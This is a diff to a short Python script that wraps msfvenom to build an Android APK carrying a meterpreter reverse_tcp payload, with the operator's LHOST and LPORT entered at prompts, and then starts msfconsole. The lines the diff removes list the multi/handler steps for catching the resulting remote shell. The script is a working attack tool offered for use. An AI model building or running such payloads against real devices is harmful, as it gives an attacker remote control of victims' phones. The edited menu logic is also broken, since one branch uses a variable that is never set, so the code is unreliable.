@@ -35,16 +35,20 @@ print('''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ''')
-name = input(' Enter name apk payload : ')
-host = input(' Enter LHOST : ')
-port = input(' Enter LPORT : ')
-os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} R > /home/kali/{name}')
-print()
-print('The payload was made ')
-print()
-print("1-Start MetaSploit\n2-View Commands") 
-inp2=input("Enter ( 1 or 2 ) : ")
+print("1-Start MetaSploit\n2-Make Payload")
+inp1=input("Enter ( 1 or 2 ) : ")
+if inp1=="2":
+    name = input(' Enter name apk payload : ')
+    host = input(' Enter LHOST : ')
+    port = input(' Enter LPORT : ')
+    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} R > /home/kali/{name}')
+    print()
+    print('The payload was made ')
+    print("1-Start MetaSploit\n2-View Commands") 
+    inp2=input("Enter ( 1 or 2 ) : ")
+elif inp1=="1":
+    os.system('msfconsole')
 if inp2=="2":
-    print('1- use exploit/multi/handle\n2- set PAYLOAD android/meterpreter/reverse_tcp\n3- set LHOST <ip>\n4- set LPORT <port>\n5- run')
-else:
+    print('1- use exploit/multi/handle')
+elif inp2=="1":
     os.system('msfconsole')
